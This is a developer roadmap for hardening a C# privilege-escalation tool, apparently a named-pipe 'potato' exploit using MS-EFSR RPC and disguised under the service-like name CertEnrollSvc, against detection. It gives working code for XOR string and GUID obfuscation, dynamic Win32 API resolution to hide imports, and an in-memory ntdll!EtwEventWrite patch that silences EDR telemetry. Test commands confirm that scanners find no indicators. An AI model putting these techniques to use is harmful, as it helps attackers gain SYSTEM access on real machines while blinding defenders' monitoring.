# CertEnrollSvc Evasion Roadmap

4 upgrades planned for `CertEnrollSvc.cs` to harden against static analysis and behavioral telemetry. Each phase is independent and can be applied incrementally.

---

## Phase 1 — Position-Dependent XOR (String + MIDL Stubs)

**Goal:** Replace all single-byte XOR `0x41` and `char[]` assembly with position-dependent XOR encoding.

**Formula:** `encoded[i] = plaintext[i] ^ ((0xA3 + i * 0x5B) & 0xFF)`

**Scope of changes:**

1. **MIDL stub arrays** — re-encode `MIDL_ProcFormatStringx86`, `MIDL_ProcFormatStringx64`, `MIDL_TypeFormatStringx86`, `MIDL_TypeFormatStringx64` using the position-dependent formula. Replace `Xd()` decoder with:
   ```csharp
   static byte[] D(byte[] b) {
       var r = new byte[b.Length];
       for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ (byte)(0xA3 + i * 0x5B));
       return r;
   }
   ```

2. **Sensitive strings** — convert `char[]`-assembled strings to XOR-encoded `byte[]` arrays, decoded via:
   ```csharp
   static string S(byte[] b) {
       var r = new byte[b.Length];
       for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ (byte)(0xA3 + i * 0x5B));
       return Encoding.UTF8.GetString(r);
   }
   ```
   Strings to convert:
   - `"SeImpersonatePrivilege"`
   - `"WinSta0\\Default"`
   - `"\\\\localhost/PIPE/"`
   - `"lsarpc"`, `"efsrpc"`, `"samr"`, `"lsass"`, `"netlogon"` (endpoint names)
   - `"ncacn_np"` (RPC protocol sequence)

3. **MS-EFSR interface GUIDs** — encode as XOR byte arrays instead of split string concat (current split is defeated by compiler constant-folding).

**Why this matters:** Single-byte XOR is trivially brute-forced (256 attempts). Position-dependent key has no single extractable constant — FLOSS/CyberChef single-byte brute-force yields nothing.

**Verification:** Compile, run `strings` / FLOSS on output binary, confirm no plaintext IOC strings or MIDL byte patterns appear.

---

## Phase 2 — Dynamic API Resolution (IAT Reduction)

**Goal:** Remove sensitive Win32 API names from the PE Import Address Table. The compiled binary should import only `GetModuleHandleW` and `GetProcAddress` from `kernel32.dll`.

**APIs to move from `[DllImport]` to runtime delegate resolution:**

| Current `[DllImport]` | DLL | Why sensitive |
|---|---|---|
| `CreateNamedPipe` | kernel32 | Named pipe creation — potato signature |
| `ConnectNamedPipe` | kernel32 | Pipe listener — potato signature |
| `ImpersonateNamedPipeClient` | advapi32 | Token impersonation — high-signal IOC |
| `CreateProcessAsUser` | advapi32 | SYSTEM process spawn — priv esc fingerprint |
| `AdjustTokenPrivileges` | advapi32 | Privilege manipulation |
| `LookupPrivilegeValue` | advapi32 | Privilege lookup |
| `CreateFile` | kernel32 | Used in pipe cancel path |
| `CreatePipe` | kernel32 | stdout/stderr pipe |
| `CloseHandle` | kernel32 | Handle cleanup |

**Implementation pattern:**

```csharp
// Retain only these two in [DllImport]
[DllImport("kernel32")] static extern IntPtr GetModuleHandleW(string module);
[DllImport("kernel32", CharSet = CharSet.Ansi)]
static extern IntPtr GetProcAddress(IntPtr hMod, string proc);

// Runtime delegate pattern
[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
delegate IntPtr D_CreateNamedPipe(string name, int i1, int i2, int i3, int i4, int i5, int i6, IntPtr zero);
static D_CreateNamedPipe pfCreateNamedPipe;

// In Main(), resolve all delegates before use:
IntPtr hK32 = GetModuleHandleW(S(_k32));       // XOR-decoded "kernel32.dll"
IntPtr hAdv = GetModuleHandleW(S(_adv32));      // XOR-decoded "advapi32.dll"
pfCreateNamedPipe = R<D_CreateNamedPipe>(hK32, S(_k32_cnp));  // XOR-decoded "CreateNamedPipeW"
// ... repeat for all APIs

static T R<T>(IntPtr hMod, string proc) {
    return (T)(object)Marshal.GetDelegateForFunctionPointer(
        GetProcAddress(hMod, proc), typeof(T));
}
```

**API name strings** are stored as XOR byte arrays (Phase 1 formula) and decoded only at resolution time.

**New encoded string entries needed:**

| Variable | Plaintext |
|---|---|
| `_k32` | `kernel32.dll` |
| `_adv32` | `advapi32.dll` |
| `_rpcrt4` | `Rpcrt4.dll` |
| `_k32_cnp` | `CreateNamedPipeW` |
| `_k32_cnpipe` | `ConnectNamedPipe` |
| `_k32_cf` | `CreateFileW` |
| `_k32_cp` | `CreatePipe` |
| `_k32_ch` | `CloseHandle` |
| `_adv_inp` | `ImpersonateNamedPipeClient` |
| `_adv_cpau` | `CreateProcessAsUserW` |
| `_adv_atp` | `AdjustTokenPrivileges` |
| `_adv_lpv` | `LookupPrivilegeValueW` |

**RPC APIs** (`RpcBindingFromStringBinding`, `NdrClientCall2`, etc.) — also move to delegate resolution from `Rpcrt4.dll` using same pattern.

**Verification:** `dumpbin /imports CertEnrollSvc.exe` should show only `GetModuleHandleW` and `GetProcAddress`.

---

## Phase 3 — GUID Encoding

**Goal:** Eliminate MS-EFSR interface GUIDs from the compiled binary.

**Current problem:** `string g1 = "c681d488-d850-11d0-" + "8c52-00c04fd90f7e"` — C# compiler constant-folds this into a single contiguous string in IL. YARA rules matching the GUID find it trivially.

**Fix:** Store both GUIDs as XOR-encoded byte arrays (Phase 1 formula):

```csharp
// Encode "c681d488-d850-11d0-8c52-00c04fd90f7e" as byte[]
static readonly byte[] _guid_lsarpc = new byte[] { /* XOR-encoded bytes */ };
// Encode "df1941c5-fe89-4e79-bf10-463657acf44d" as byte[]
static readonly byte[] _guid_efsrpc = new byte[] { /* XOR-encoded bytes */ };

// In constructor:
IDictionary<string, string> endpointMap = new Dictionary<string, string>() {
    {"lsarpc",   S(_guid_lsarpc)},
    {"efsrpc",   S(_guid_efsrpc)},
    {"samr",     S(_guid_lsarpc)},
    {"lsass",    S(_guid_lsarpc)},
    {"netlogon", S(_guid_lsarpc)}
};
```

Endpoint name keys (`"lsarpc"` etc.) also use `S()` decode from Phase 1.

**Verification:** `strings` on binary should not contain `c681d488` or `df1941c5` or any substring of either GUID.

---

## Phase 4 — ETW Suppression

**Goal:** Patch `ntdll!EtwEventWrite` to suppress ETW telemetry for the process lifetime, preventing EDR from receiving kernel-originated events for API calls in the exploit chain.

**Patch target:** `ntdll.dll` export `EtwEventWrite` — overwrite first 3 bytes with `33 C0 C3` (`xor eax, eax; ret`), making every ETW write return `STATUS_SUCCESS` without emitting events.

**Implementation:**

```csharp
static void SuppressEventTracing() {
    IntPtr hNtdll = GetModuleHandleW(S(_ntdll));  // XOR-decoded "ntdll.dll"
    IntPtr pTarget = GetProcAddress(hNtdll, S(_etw_fn));  // XOR-decoded "EtwEventWrite"
    if (pTarget == IntPtr.Zero) return;

    uint oldProtect;
    VirtualProtect(pTarget, 4, 0x40 /* PAGE_EXECUTE_READWRITE */, out oldProtect);
    Marshal.WriteByte(pTarget, 0, 0x33);  // xor eax, eax
    Marshal.WriteByte(pTarget, 1, 0xC0);
    Marshal.WriteByte(pTarget, 2, 0xC3);  // ret
    VirtualProtect(pTarget, 4, oldProtect, out oldProtect);
}
```

**Call order:** Must be called at the very beginning of `Main()`, before any named pipe creation or RPC call, so no ETW events leak from the exploit chain.

**New encoded strings:**

| Variable | Plaintext |
|---|---|
| `_ntdll` | `ntdll.dll` |
| `_etw_fn` | `EtwEventWrite` |

**`VirtualProtect`** — also needs dynamic resolution (Phase 2 pattern) to avoid IAT entry. Add:

| Variable | Plaintext |
|---|---|
| `_k32_vp` | `VirtualProtect` |

**CLR compatibility note:** .NET CLR uses `advapi32!EventWrite` for managed ETW (CLR runtime provider), not `ntdll!EtwEventWrite`. Patching the ntdll export does not affect CLR stability. However, test for side effects:
- Verify `ManagementScope.Connect()` (WMI, used by `RpcServiceClient`) still works after patch — WMI uses DCOM, not ntdll ETW.
- Verify no crash in `WindowsIdentity.GetCurrent()` — this reads token info, should not depend on ETW.

**Verification:** Run with ETW consumer (e.g., `logman` trace session for `Microsoft-Windows-Kernel-Process`) — confirm no process creation or API events emitted from `CertEnrollSvc.exe` PID.

---

## Execution Order

When implementing all 4 phases together, the dependency order is:

1. **Phase 1 first** — introduces `S()` / `D()` decode functions and XOR byte array format used by all subsequent phases
2. **Phase 2 + Phase 3** — can be done in parallel, both depend on Phase 1's `S()` function
3. **Phase 4 last** — depends on Phase 2 (needs `VirtualProtect` dynamically resolved)

## Build & Test

```cmd
csc /target:exe /platform:x64 /optimize+ /out:CertEnrollSvc.exe CertEnrollSvc.cs -nowarn:1691,618
```

Static analysis checks after each phase:
- `strings CertEnrollSvc.exe | findstr /i "Impersonate\|EfsRpc\|SeImpersonate\|c681d488\|Potato"` — should return nothing
- `dumpbin /imports CertEnrollSvc.exe` — after Phase 2, only `GetModuleHandleW` + `GetProcAddress`
- FLOSS on binary — no decoded IOC strings
